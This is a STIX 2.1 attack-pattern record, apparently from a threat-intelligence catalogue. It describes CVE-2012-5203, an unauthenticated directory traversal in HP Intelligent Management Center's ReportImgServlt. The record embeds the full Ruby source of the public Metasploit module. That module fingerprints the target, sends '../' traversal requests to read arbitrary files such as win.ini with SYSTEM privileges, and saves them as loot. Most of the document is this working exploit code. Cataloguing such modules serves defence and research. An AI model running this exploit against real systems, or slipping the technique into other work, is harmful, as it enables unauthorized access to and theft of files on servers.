{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--953b7601-3ca4-4b28-8c44-820951562615",
    "created": "2024-08-14T16:31:12.941154Z",
    "modified": "2024-08-14T16:31:12.941158Z",
    "name": "HP Intelligent Management ReportImgServlt Directory Traversal",
    "description": " This module exploits a lack of authentication and a directory traversal in HP Intelligent Management, specifically in the ReportImgServlt, in order to retrieve arbitrary files with SYSTEM privileges. This module has been tested successfully on HP Intelligent Management Center 5.1 E0202 over Windows 2003 SP2.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/hp_imc_reportimgservlt_traversal.rb",
            "external_id": "hp_imc_reportimgservlt_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-5203"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP Intelligent Management ReportImgServlt Directory Traversal',\n      'Description'    => %q{\n          This module exploits a lack of authentication and a directory traversal in HP\n        Intelligent Management, specifically in the ReportImgServlt, in order to retrieve\n        arbitrary files with SYSTEM privileges. This module has been tested successfully on\n        HP Intelligent Management Center 5.1 E0202 over Windows 2003 SP2.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-5203' ],\n          [ 'OSVDB', '91028' ],\n          [ 'BID', '58672' ],\n          [ 'ZDI', '13-052' ]\n        ]\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'Path to HP Intelligent Management Center', '/imc']),\n        OptString.new('FILEPATH', [true, 'The name of the file to download', '/windows\\\\win.ini']),\n        # By default files downloaded from C:\\Program Files\\iMC\\client\\bin\\\n        OptInt.new('DEPTH', [true, 'Traversal depth', 4])\n      ])\n  end\n\n  def is_imc?\n    res = send_request_cgi({\n      'uri'    => normalize_uri(target_uri.path.to_s, \"login.jsf\"),\n      'method' => 'GET'\n    })\n\n    if res and res.code == 200 and res.body =~ /HP Intelligent Management Center/\n      return true\n    else\n      return false\n    end\n  end\n\n  def my_basename(filename)\n    return ::File.basename(filename.gsub(/\\\\/, \"/\"))\n  end\n\n  def run_host(ip)\n\n    if not is_imc?\n      vprint_error(\"#{rhost}:#{rport} - This isn't a HP Intelligent Management Center\")\n      return\n    end\n\n    travs = \"\"\n    travs << \"../\" * datastore['DEPTH']\n    travs << datastore['FILEPATH']\n\n    vprint_status(\"#{rhost}:#{rport} - Sending request...\")\n    res = send_request_cgi({\n      'uri'          => normalize_uri(target_uri.path.to_s, \"reportImg\"),\n      'method'       => 'GET',\n      'vars_get'     =>\n        {\n          'path' => travs\n        }\n    })\n\n    if res and res.code == 200 and res.headers['Content-Type'] and res.headers['Content-Type'] == \"image/png\"\n      contents = res.body\n      fname = my_basename(datastore['FILEPATH'])\n      path = store_loot(\n        'hp.imc.faultdownloadservlet',\n        'application/octet-stream',\n        ip,\n        contents,\n        fname\n      )\n      print_good(\"#{rhost}:#{rport} - File saved in: #{path}\")\n    else\n      vprint_error(\"#{rhost}:#{rport} - Failed to retrieve file\")\n      return\n    end\n  end\nend\n"
}